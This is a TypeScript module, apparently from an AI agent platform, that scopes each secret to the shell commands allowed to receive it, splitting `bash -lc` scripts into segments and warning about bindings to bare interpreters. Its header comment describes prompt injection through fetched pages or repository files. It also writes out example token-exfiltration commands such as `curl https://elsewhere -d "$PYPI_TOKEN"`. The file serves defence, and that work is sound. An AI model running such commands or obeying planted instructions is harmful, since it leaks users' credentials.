/**
 * Which of an agent's secrets one command receives.
 *
 * `exec_secrets` handed every named secret to every command an agent ran. Masking kept the values out of what came
 * back; nothing kept them in: `curl https://elsewhere -d "$PYPI_TOKEN"` sent one out, and an instruction planted in a
 * fetched page or a repository file could make the agent run it. So each secret is bound to the commands that need
 * it, and a command receives the secrets whose bindings it matches — all of it.
 *
 * All of it, because `exec` runs a command line under `bash -lc`: `twine upload && curl elsewhere -d "$PYPI_TOKEN"`
 * starts with `twine upload` and spends the token on the second segment. Every segment has to match a binding of
 * the secret, read with the reader the allowlist uses — which gives up on anything it does not model, a command
 * substitution or a program run through `env` or `sh -c`, and gets nothing then.
 *
 * Pure: the names come back, and the engine turns them into values at spawn.
 */

import { launchedScript, programName, scriptSegments } from "./shell-segments.ts";

/** A secret and the commands it reaches — `ExecSecret` in `@nouride/shared`, by shape. */
export interface SecretBinding {
  name: string;
  /** Argv prefixes, `"twine upload"`, or `"*"` for every command. */
  commands: readonly string[];
}

/** The command's segments: one for an argv, each of a `bash -lc` script's — or null where the script is unreadable. */
export function commandSegments(argv: readonly string[]): string[][] | null {
  const script = launchedScript(argv);
  return script === null ? [[...argv]] : scriptSegments(script, { expansions: true });
}

/**
 * A launched script's segments for binding a grant to the files it runs, where `commandSegments` gave up on it: split
 * naively, on the operators and then on whitespace, quotes around a word and leading `NAME=value` words dropped.
 * `bash -lc "./deploy.sh && echo done"` is the case — a path is no literal program name to the strict reader.
 *
 * Never for deciding what runs: quoting or a substitution can hide a command from it. Binding can use it because a
 * word read wrongly only adds a digest, so the grant asks again sooner, and the engine counts a command read this
 * way as one whose files are not all bound. An argv that launches no script is its own one segment.
 */
export function looseSegments(argv: readonly string[]): string[][] {
  const script = launchedScript(argv);
  if (script === null) return [[...argv]];
  return script
    .split(/\|\||&&|[;\n|&(){}]/)
    .map((segment) => {
      const words = segment.trim().split(/\s+/).filter(Boolean).map((word) => word.replace(/^(['"])(.*)\1$/, "$2"));
      while (words.length > 0 && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0]!)) words.shift();
      return words;
    })
    .filter((words) => words.length > 0);
}

/** Whether `segment` starts with `command`'s words — its program compared by name, wherever it is installed. */
function startsWith(segment: readonly string[], command: string): boolean {
  const words = command.split(" ");
  if (segment.length < words.length) return false;
  return words.every((word, i) => (i === 0 ? programName(segment[0] ?? "") === programName(word) : segment[i] === word));
}

/**
 * The names of the secrets `argv` receives, in the order they are configured. `null` is an interactive session, the
 * widest command there is: only a secret bound to `*` reaches one.
 */
export function secretsFor(argv: readonly string[] | null, secrets: readonly SecretBinding[]): string[] {
  const segments = argv === null ? null : commandSegments(argv);
  return secrets
    .filter(
      (secret) =>
        secret.commands.includes("*") ||
        (segments !== null && segments.every((segment) => secret.commands.some((command) => command !== "*" && startsWith(segment, command)))),
    )
    .map((secret) => secret.name);
}

/** Programs that run whatever they are handed: a binding to one alone is `*` by another name. */
const RUNS_ANYTHING = new Set([
  "sh", "bash", "zsh", "dash", "ksh", "fish",
  "python", "python3", "node", "bun", "deno", "ruby", "perl", "php",
  "env", "xargs", "sudo", "doas", "nohup", "time", "timeout", "nice", "exec", "eval", "command", "builtin", "source", ".",
]);

/**
 * What to say at boot about one agent's bindings: a binding that is a bare interpreter or shell — it reaches whatever
 * that program is asked to run.
 */
export function secretBindingWarnings(secrets: readonly SecretBinding[]): string[] {
  const warnings: string[] = [];
  for (const secret of secrets) {
    for (const command of secret.commands) {
      if (command !== "*" && !command.includes(" ") && RUNS_ANYTHING.has(programName(command))) {
        warnings.push(`exec_secrets.${secret.name} is bound to "${command}" alone, which runs anything it is handed: that is "*" by another name`);
      }
    }
  }
  return warnings;
}
